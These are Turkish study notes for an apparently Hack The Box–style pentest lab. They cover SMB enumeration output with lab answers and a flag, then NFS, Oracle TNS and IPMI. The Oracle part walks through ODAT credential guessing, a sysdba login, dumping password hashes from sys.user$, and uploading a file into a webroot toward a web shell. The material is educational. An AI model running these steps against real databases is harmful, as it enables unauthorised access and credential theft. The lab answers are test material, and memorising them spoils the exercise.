- DEVSMB          <00> -         H <ACTIVE>  Workstation Service
- DEVSMB          <03> -         H <ACTIVE>  Messenger Service
- DEVSMB          <20> -         H <ACTIVE>  File Server Service
- ..__MSBROWSE__. <01> - <GROUP> H <ACTIVE>  Master Browser
- DEVOPS          <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name
- DEVOPS          <1d> -         H <ACTIVE>  Master Browser
- DEVOPS          <1e> - <GROUP> H <ACTIVE>  Browser Service Elections
- MAC Address = 00-00-00-00-00-00

 ==========================================
|    SMB Dialect Check on 10.129.14.128    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
SMB 1.0: false
SMB 2.02: true
SMB 2.1: true
SMB 3.0: true
SMB1 only: false
Preferred dialect: SMB 3.0
SMB signing required: false

 ==========================================
|    RPC Session Check on 10.129.14.128    |
 ==========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user session
[+] Server allows session using username 'juzgtcsu', password ''
[H] Rerunning enumeration with user 'juzgtcsu' might give more results

 ====================================================
|    Domain Information via RPC for 10.129.14.128    |
 ====================================================
[+] Domain: DEVOPS
[+] SID: NULL SID
[+] Host is part of a workgroup (not a domain)

 ============================================================
|    Domain Information via SMB session for 10.129.14.128    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DEVSMB
NetBIOS domain name: ''
DNS domain: ''
FQDN: htb

 ================================================
|    OS Information via RPC for 10.129.14.128    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Windows 7, Windows Server 2008 R2
OS version: '6.1'
OS release: ''
OS build: '0'
Native OS: not supported
Native LAN manager: not supported
Platform id: '500'
Server type: '0x809a03'
Server type string: Wk Sv PrQ Unx NT SNT DEVSM

 ======================================
|    Users via RPC on 10.129.14.128    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[+] Found 2 users via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 2 users via 'enumdomusers'
[+] After merging user results we have 2 users total:
'1000':
  username: mrb3n
  name: ''
  acb: '0x00000010'
  description: ''
'1001':
  username: cry0l1t3
  name: cry0l1t3
  acb: '0x00000014'
  description: ''

 =======================================
|    Groups via RPC on 10.129.14.128    |
 =======================================
[*] Enumerating local groups
[+] Found 0 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 0 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 0 group(s) via 'enumdomgroups'

 =======================================
|    Shares via RPC on 10.129.14.128    |
 =======================================
[*] Enumerating shares
[+] Found 5 share(s):
IPC$:
  comment: IPC Service (DEVSM)
  type: IPC
dev:
  comment: DEVenv
  type: Disk
home:
  comment: INFREIGHT Samba
  type: Disk
notes:
  comment: CheckIT
  type: Disk
print$:
  comment: Printer Drivers
  type: Disk
[*] Testing share IPC$
[-] Could not check share: STATUS_OBJECT_NAME_NOT_FOUND
[*] Testing share dev
[-] Share doesn't exist
[*] Testing share home
[+] Mapping: OK, Listing: OK
[*] Testing share notes
[+] Mapping: OK, Listing: OK
[*] Testing share print$
[+] Mapping: DENIED, Listing: N/A

 ==========================================
|    Policies via RPC for 10.129.14.128    |
 ==========================================
[*] Trying port 445/tcp
[+] Found policy:
domain_password_information:
  pw_history_length: None
  min_pw_length: 5
  min_pw_age: none
  max_pw_age: 49710 days 6 hours 21 minutes
  pw_properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
domain_lockout_information:
  lockout_observation_window: 30 minutes
  lockout_duration: 30 minutes
  lockout_threshold: None
domain_logoff_information:
  force_logoff_time: 49710 days 6 hours 21 minutes

 ==========================================
|    Printers via RPC for 10.129.14.128    |
 ==========================================
[+] No printers returned (this is not an error)

Completed after 0.61 seconds
```

Numaralandırma için ikiden fazla araç kullanmamız gerekir. Çünkü araçların programlanması nedeniyle, manuel olarak kontrol etmemiz gereken farklı bilgiler elde edebiliriz. Bu nedenle, nasıl yazıldıklarını tam olarak bilmediğimiz otomatik araçlara asla güvenmemeliyiz.



Soru : Hedef sistemde SMB sunucusunun hangi sürümü çalışıyor? Başlığın tamamını cevap olarak gönderin.

Cevap : `Samba smbd 4.6.2`

![Pasted image 20241226162127.png](/img/user/resimler/Pasted%20image%2020241226162127.png)

Soru : Hedef üzerindeki erişilebilir paylaşımın adı nedir?

Cevap : `sambashare`

![Pasted image 20241226162303.png](/img/user/resimler/Pasted%20image%2020241226162303.png)

Soru : Keşfedilen paylaşıma bağlanın ve flag.txt dosyasını bulun. İçeriği cevap olarak gönderin.

Cevap : `HTB{o873nz4xdo873n4zo873zn4fksuhldsf}`

![Pasted image 20241226162702.png](/img/user/resimler/Pasted%20image%2020241226162702.png)

![Pasted image 20241226162833.png](/img/user/resimler/Pasted%20image%2020241226162833.png)

Soru : Sunucunun hangi domain'e ait olduğunu bulun.

Cevap : DEVOPS

![Pasted image 20241226163037.png](/img/user/resimler/Pasted%20image%2020241226163037.png)


Soru :Daha önce bulduğumuz belirli bir paylaşım hakkında ek bilgi bulun ve bu belirli paylaşımın özelleştirilmiş sürümünü yanıt olarak gönderin.

Cevap : `InFreight SMB v3.1`

![Pasted image 20241226163431.png](/img/user/resimler/Pasted%20image%2020241226163431.png)


Soru : Söz konusu paylaşımın tam sistem yolu nedir? (format: “/directory/names”)
Cevap :  ==/home/sambauser==





# NFS

**Network File System (NFS)**, Sun Microsystems tarafından geliştirilen bir ağ dosya sistemi olup, **SMB** ile aynı amaca sahiptir. Amacı, bir ağ üzerinden dosya sistemlerine lokalmiş gibi erişim sağlamaktır. Ancak, tamamen farklı bir protokol kullanır.

**NFS**, Linux ve Unix sistemleri arasında kullanılır. Bu, **NFS clients**'ın doğrudan **SMB servers** ile iletişim kuramayacağı anlamına gelir. NFS, [[Bağlantılar/dağıtılmış dosya sistemi\|dağıtılmış dosya sistemi]] prosedürlerini yöneten bir **Internet standardı**dır.

Uzun yıllardır kullanılan **NFS protocol version 3.0 (NFSv3)**, istemci bilgisayarın kimliğini doğrular. Ancak bu durum, **NFSv4** ile değişir. Burada, **Windows SMB protocol**ünde olduğu gibi kullanıcı kimlik doğrulaması yapılması gerekmektedir.


| **Versiyon** | **Özellikler**                                                                                                                                                                                                                                                                                               |
| ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **NFSv2**    | Daha eski bir sürümdür, ancak birçok sistem tarafından desteklenir ve başlangıçta tamamen **UDP** üzerinden çalıştırılmıştır.                                                                                                                                                                                |
| **NFSv3**    | Değişken dosya boyutu ve daha iyi hata raporlama gibi daha fazla özelliğe sahiptir, ancak **NFSv2 clients** ile tamamen uyumlu değildir.                                                                                                                                                                     |
| **NFSv4**    | **Kerberos** içerir, **firewalls** üzerinden ve **Internet** üzerinde çalışabilir, artık **[[Bağlantılar/portmapper\|portmapper]]** gerektirmez, **ACLs** destekler, durum tabanlı (state-based) işlemler uygular ve performans iyileştirmeleri ile yüksek güvenlik sunar. Ayrıca, duruma dayalı bir protokol kullanan ilk sürümdür. |



































# Oracle TNS

`Oracle Transparent Network Substrate` (`TNS`) sunucusu, Oracle veritabanları ve uygulamaları arasında ağlar üzerinden iletişimi kolaylaştıran bir iletişim protokolüdür. Başlangıçta [Oracle Net Services](“https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html”) yazılım paketinin bir parçası olarak sunulan TNS, Oracle veritabanları ve client uygulamaları arasında `IPX/SPX` ve `TCP/IP` protokol stack'leri gibi çeşitli ağ protokollerini destekler. Sonuç olarak, sağlık, finans ve perakende sektörlerinde büyük, karmaşık veritabanlarını yönetmek için tercih edilen bir çözüm haline gelmiştir. Buna ek olarak, yerleşik şifreleme mekanizması iletilen verilerin güvenliğini sağlar ve veri güvenliğinin çok önemli olduğu kurumsal ortamlar için ideal bir çözüm haline getirir.  

Zaman içinde TNS, `IPv6` ve `SSL/TLS` şifreleme gibi daha yeni teknolojileri destekleyecek şekilde güncellenerek aşağıdaki amaçlar için daha uygun hale getirilmiştir:

![Pasted image 20241109214224.png](/img/user/resimler/Pasted%20image%2020241109214224.png)

Ayrıca, TCP/IP protokol katmanı üzerinde ek bir güvenlik katmanı aracılığıyla client ve server iletişimi arasında şifreleme sağlar. Bu özellik, veritabanı mimarisini yetkisiz erişime veya ağ trafiğindeki verileri tehlikeye atmaya çalışan saldırılara karşı korumaya yardımcı olur. Ayrıca, kapsamlı performans izleme ve analiz araçları, hata raporlama ve günlük tutma yetenekleri, iş yükü yönetimi ve veritabanı hizmetleri aracılığıyla hata toleransı sunduğu için veritabanı yöneticileri ve geliştiricileri için gelişmiş araçlar ve yetenekler sağlar.

## **Varsayılan Yapılandırma**  

Oracle TNS sunucusunun varsayılan yapılandırması, yüklü Oracle yazılımının sürümüne ve baskısına bağlı olarak değişir. Ancak, bazı genel ayarlar genellikle Oracle TNS'de varsayılan olarak yapılandırılır. Varsayılan olarak, dinleyici `TCP/1521` portunda gelen bağlantıları dinler. Ancak bu varsayılan port kurulum sırasında veya daha sonra yapılandırma dosyasında değiştirilebilir. TNS dinleyicisi `TCP/IP`, `UDP`, `IPX/SPX` ve `AppleTalk` dahil olmak üzere çeşitli ağ protokollerini destekleyecek şekilde yapılandırılmıştır. Dinleyici ayrıca birden fazla ağ arabirimini destekleyebilir ve belirli IP adreslerini ya da mevcut tüm ağ arabirimlerini dinleyebilir. Varsayılan olarak, Oracle TNS `Oracle 8i/9i` 'de uzaktan yönetilebilir ancak Oracle 10g/11g'de yönetilemez.  

TNS dinleyicisinin varsayılan yapılandırması birkaç temel güvenlik özelliği de içerir. Örneğin, dinleyici yalnızca yetkili hostlardan gelen bağlantıları kabul eder ve host adları, IP adresleri, kullanıcı adları ve parolaların bir kombinasyonunu kullanarak temel kimlik doğrulama gerçekleştirir. Ayrıca dinleyici, client ve server arasındaki iletişimi şifrelemek için Oracle Net Services kullanacaktır. Oracle TNS için yapılandırma dosyaları `tnsnames.ora` ve `listener.ora` olarak adlandırılır ve genellikle `$ORACLE_HOME/network/admin` dizininde bulunur. Düz metin dosyası, Oracle veritabanı örnekleri ve TNS protokolünü kullanan diğer ağ hizmetleri için yapılandırma bilgileri içerir.

Oracle TNS genellikle Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, web sunucuları gibi diğer Oracle servisleriyle birlikte kullanılır. Oracle servislerinin varsayılan kurulumu için birçok değişiklik yapılmıştır. Örneğin, Oracle 9'da varsayılan parola `CHANGE_ON_INSTALL` iken, Oracle 10'da varsayılan parola belirlenmemiştir. Oracle DBSNMP servisi de `dbsnmp adında` varsayılan bir parola kullanmaktadır ve bununla karşılaştığımızda hatırlamamız gerekir. Bir başka örnek de, birçok kuruluşun hala Oracle ile birlikte `finger` hizmetini kullanmasıdır, bu da Oracle'ın hizmetini riske atabilir ve bir home dizini hakkında gerekli bilgiye sahip olduğumuzda onu savunmasız hale getirebilir.  

Her veritabanı veya hizmetin [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) dosyasında istemcilerin hizmete bağlanması için gerekli bilgileri içeren benzersiz bir girişi vardır. Giriş, hizmet için bir ad, hizmetin ağ konumu ve istemcilerin hizmete bağlanırken kullanması gereken veritabanı veya hizmet adından oluşur. Örneğin, basit bir `tnsnames.ora` dosyası aşağıdaki gibi görünebilir:


#### Tnsnames.ora

```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

Burada, `10.129.11.102` IP adresinde `TCP/1521` portunu dinleyen `ORCL` adlı bir hizmet görüyoruz. İstemciler hizmete bağlanırken `orcl` hizmet adını kullanmalıdır. Ancak, tnsnames.ora dosyası farklı veritabanları ve hizmetler için bu tür birçok giriş içerebilir. Girişler ayrıca kimlik doğrulama ayrıntıları, bağlantı havuzu ayarları ve yük dengeleme yapılandırmaları gibi ek bilgiler de içerebilir.  

Öte yandan, `listener.ora` dosyası, gelen istemci isteklerini almaktan ve bunları uygun Oracle veritabanı örneğine iletmekten sorumlu olan dinleyici işleminin özelliklerini ve parametrelerini tanımlayan sunucu tarafında bir yapılandırma dosyasıdır.

#### Listener.ora

```txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

Kısacası, client tarafı Oracle Net Services yazılımı servis adlarını ağ adreslerine çözümlemek için `tnsnames.ora` dosyasını kullanırken, dinleyici işlemi dinlemesi gereken servisleri ve dinleyicinin davranışını belirlemek için listener `.ora` dosyasını kullanır.  

Oracle veritabanları PL/SQL Dışlama Listesi (`PlsqlExclusionList`) kullanılarak korunabilir. Bu, `$ORACLE_HOME/sqldeveloper` dizinine yerleştirilmesi gereken, kullanıcı tarafından oluşturulmuş bir metin dosyasıdır ve yürütme dışında tutulması gereken PL/SQL paketlerinin veya türlerinin adlarını içerir. PL/SQL Dışlama Listesi dosyası oluşturulduktan sonra, veritabanı örneğine yüklenebilir. Oracle Uygulama Sunucusu üzerinden erişilemeyen bir kara liste görevi görür.

![Pasted image 20241109215325.png](/img/user/resimler/Pasted%20image%2020241109215325.png)

TNS dinleyicisini listelemeden ve onunla etkileşime geçmeden önce, `Pwnbox` örneğimiz için birkaç paket ve araç indirmemiz gerekiyor, eğer bunlar zaten yoksa. İşte tüm bunları yapan bir Bash betiği:

#### Oracle-Tools-setup.sh
```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```
Bundan sonra, aşağıdaki komutu çalıştırarak kurulumun başarılı olup olmadığını belirlemeye çalışabiliriz:


#### Testing ODAT

```shell-session
[!bash!]$ ./odat.py -h

usage: odat.py [-h] [--version]
               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
               ...

            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
...SNIP...
```

Oracle Database Attacking Tool (`ODAT`) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.

Let's now use `nmap` to scan the default Oracle TNS listener port.

#### Nmap
```shell-session
[!bash!]$ sudo nmap -p1521 -sV 10.129.204.235 --open

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
Nmap scan report for 10.129.204.235
Host is up (0.0041s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

Portun açık olduğunu ve servisin çalıştığını görebiliriz. Oracle RDBMS'de Sistem Tanımlayıcısı (`SID`), belirli bir veritabanı örneğini tanımlayan benzersiz bir addır. Her biri kendi Sistem Kimliğine sahip birden fazla örneği olabilir. Örnek, veritabanı verilerini yönetmek için etkileşimde bulunan bir dizi işlem ve bellek yapısıdır. Bir istemci bir Oracle veritabanına bağlandığında, bağlantı dizesiyle birlikte veritabanının `SID` 'sini belirtir. İstemci, hangi veritabanı örneğine bağlanmak istediğini belirlemek için bu SID'yi kullanır. İstemcinin bir SID belirtmediğini varsayalım. Bu durumda, `tnsnames.ora` dosyasında tanımlanan varsayılan değer kullanılır.  

SID'ler, istemcinin bağlanmak istediği veritabanının belirli bir örneğini tanımladığı için bağlantı sürecinin önemli bir parçasıdır. İstemci yanlış bir SID belirtirse, bağlantı girişimi başarısız olur. Veritabanı yöneticileri, bir veritabanının tek tek örneklerini izlemek ve yönetmek için SID'yi kullanabilir. Örneğin, Oracle Enterprise Manager gibi araçları kullanarak bir örneği başlatabilir, durdurabilir veya yeniden başlatabilir, bellek tahsisini veya diğer yapılandırma parametrelerini ayarlayabilir ve performansını izleyebilirler.

SID'leri numaralandırmanın ya da daha iyi bir deyişle tahmin etmenin çeşitli yolları vardır. Bu nedenle `nmap`, `hydra`, `odat` ve diğerleri gibi araçları kullanabiliriz. Önce `nmap` 'i kullanalım.

#### Nmap - SID Bruteforcing
```shell-session
[!bash!]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```

`odat.py` aracını, Oracle veritabanı hizmetleri ve bileşenleri hakkında bilgi toplamak amacıyla çeşitli taramalar gerçekleştirmek için kullanabiliriz. Bu taramalar veritabanı adlarını, sürümlerini, çalışan işlemleri, kullanıcı hesaplarını, güvenlik açıklarını, yanlış yapılandırmaları vb. alabilir. `All` seçeneğini kullanalım ve `odat.py` aracının tüm modüllerini deneyelim.


#### ODAT
```shell-session
[!bash!]$ ./odat.py all -s 10.129.204.235

[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

...SNIP...
```

Bu örnekte, `scott` kullanıcısı ve `tiger` parolası için geçerli kimlik bilgilerini bulduk. Bundan sonra, Oracle veritabanına bağlanmak ve onunla etkileşimde bulunmak için `sqlplus` aracını kullanabiliriz.

#### SQLplus - Log In

```shell-session
[!bash!]$ sqlplus scott/tiger@10.129.204.235/XE

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```

Aşağıdaki hatayla karşılaşırsanız `sqlplus: paylaşılan kütüphaneler yüklenirken hata: libsqlplus.so: paylaşılan nesne dosyası açılamıyor:` `Böyle bir dosya veya dizin yok`, lütfen [buradan](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared) alınan aşağıdakileri uygulayın.

```shell-session
[!bash!]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```


#### **Oracle RDBMS - Etkileşim**

```shell-session
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

...SNIP...
```

```shell-session
SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```


Burada, `scott` kullanıcısının yönetici ayrıcalıkları yoktur. Ancak, bu hesabı Sistem Veritabanı Yöneticisi (`sysdba`) olarak oturum açmak için kullanmayı deneyebiliriz, bu da bize daha yüksek ayrıcalıklar verir. Bu, `scott` kullanıcısı genellikle veritabanı yöneticisi tarafından verilen veya yöneticinin kendisi tarafından kullanılan uygun ayrıcalıklara sahip olduğunda mümkündür.


#### **Oracle RDBMS - Database Enumeration**
```shell-session
[!bash!]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
```

Bir Oracle veritabanına eriştiğimizde birçok yaklaşım izleyebiliriz. Bu büyük ölçüde elimizdeki bilgilere ve tüm kuruluma bağlıdır. Ancak, yeni kullanıcı ekleyemeyiz ya da herhangi bir değişiklik yapamayız. Bu noktadan sonra, `sys.user$` dosyasından parola hash'lerini alabilir ve çevrimdışı olarak kırmayı deneyebiliriz. Bunun için sorgu aşağıdaki gibi görünecektir:


#### **Oracle RDBMS - Parola Hash'lerini Çıkarma**

```shell-session
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

Diğer bir seçenek de hedefe bir web shell yüklemektir. Ancak bu, sunucunun bir web sunucusu çalıştırmasını gerektirir ve web sunucusu için root dizininin tam konumunu bilmemiz gerekir. Yine de, ne tür bir sistemle uğraştığımızı biliyorsak, varsayılan yolları deneyebiliriz:

![Pasted image 20241109220132.png](/img/user/resimler/Pasted%20image%2020241109220132.png)

İlk olarak, istismar yaklaşımımızı Antivirüs veya Saldırı tespit / önleme sistemleri için tehlikeli görünmeyen dosyalarla denemek her zaman önemlidir. Bu nedenle, bir dize içeren bir metin dosyası oluşturuyoruz ve bunu hedef sisteme yüklemek için kullanıyoruz.

#### Oracle RDBMS - File Upload

```shell-session
[!bash!]$ echo "Oracle File Upload Test" > testing.txt
[!bash!]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

Son olarak, dosya yükleme yaklaşımının `curl` ile çalışıp çalışmadığını test edebiliriz. Bu nedenle, bir `GET http://<IP>` isteği kullanacağız veya tarayıcı üzerinden ziyaret edebiliriz.

```shell-session
[!bash!]$ curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
```

Soru : Hedef Oracle veritabanını numaralandırın ve DBSNMP kullanıcısının parola hash'ini yanıt olarak gönderin.
Cevap : 

![Pasted image 20241110004057.png](/img/user/resimler/Pasted%20image%2020241110004057.png)

![Pasted image 20241110004114.png](/img/user/resimler/Pasted%20image%2020241110004114.png)


![Pasted image 20241110012126.png](/img/user/resimler/Pasted%20image%2020241110012126.png)

![Pasted image 20241110012206.png](/img/user/resimler/Pasted%20image%2020241110012206.png)

![Pasted image 20241110012309.png](/img/user/resimler/Pasted%20image%2020241110012309.png)

![Pasted image 20241110012412.png](/img/user/resimler/Pasted%20image%2020241110012412.png)

![Pasted image 20241110012424.png](/img/user/resimler/Pasted%20image%2020241110012424.png)



# **IPMI**  

[Akıllı Platform Yönetim Arayüzü](“https://www.thomas-krenn.com/en/wiki/IPMI_Basics”) (`IPMI`), sistem yönetimi ve izleme için kullanılan donanım tabanlı host yönetim sistemleri için bir dizi standartlaştırılmış özelliktir. Otonom bir alt sistem olarak hareket eder ve hostun BIOS'undan, CPU'sundan, firmware'inden ve temel işletim sisteminden bağımsız olarak çalışır. IPMI, sistem yöneticilerine kapalı veya yanıt vermeyen bir durumda olsalar bile sistemleri yönetme ve izleme yeteneği sağlar. Sistemin donanımına doğrudan bir ağ bağlantısı kullanarak çalışır ve bir oturum açma shell'i aracılığıyla işletim sistemine erişim gerektirmez. IPMI, hedef host'a fiziksel erişim gerektirmeden sistemlere uzaktan yükseltme yapmak için de kullanılabilir. IPMI tipik olarak üç şekilde kullanılır:

- BIOS ayarlarını değiştirmek için işletim sistemi boot etmeden önce  
- Host tamamen kapatıldığında  
- Bir sistem arızasından sonra host'a erişim

Bu görevler için kullanılmadığında, IPMI sistem sıcaklığı, voltaj, fan durumu ve güç kaynakları gibi bir dizi farklı şeyi izleyebilir. Ayrıca envanter bilgilerini sorgulamak, donanım günlüklerini incelemek ve SNMP kullanarak uyarı vermek için de kullanılabilir. Ana sistem kapatılabilir, ancak IPMI modülünün düzgün çalışması için bir güç kaynağı ve LAN bağlantısı gerekir.

IPMI protokolü ilk olarak 1998 yılında Intel tarafından yayınlanmıştır ve şu anda Cisco, Dell, HP, Supermicro, Intel ve daha fazlası dahil olmak üzere 200'den fazla sistem satıcısı tarafından desteklenmektedir. IPMI sürüm 2.0 kullanan sistemler LAN üzerinden seri olarak yönetilebilir ve sistem yöneticilerine seri konsol çıkışını bantta görüntüleme olanağı verir. IPMI çalışmak için aşağıdaki bileşenleri gerektirir:

- Anakart Yönetim Denetleyicisi (BMC) - Bir mikro denetleyici ve IPMI'nin temel bileşeni  
    
- Akıllı Şasi Yönetim Veriyolu (ICMB) - Bir şasiden diğerine iletişime izin veren bir arayüz  
    
- Akıllı Platform Yönetim Veriyolu (IPMB) - BMC'yi genişletir  
    
- IPMI Bellek - sistem olay günlüğü, depo verileri ve daha fazlası gibi şeyleri depolar  
    
- İletişim Arayüzleri - yerel sistem arayüzleri, seri ve LAN arayüzleri, ICMB ve PCI Yönetim Veriyolu


## **Footprinting the Service**  

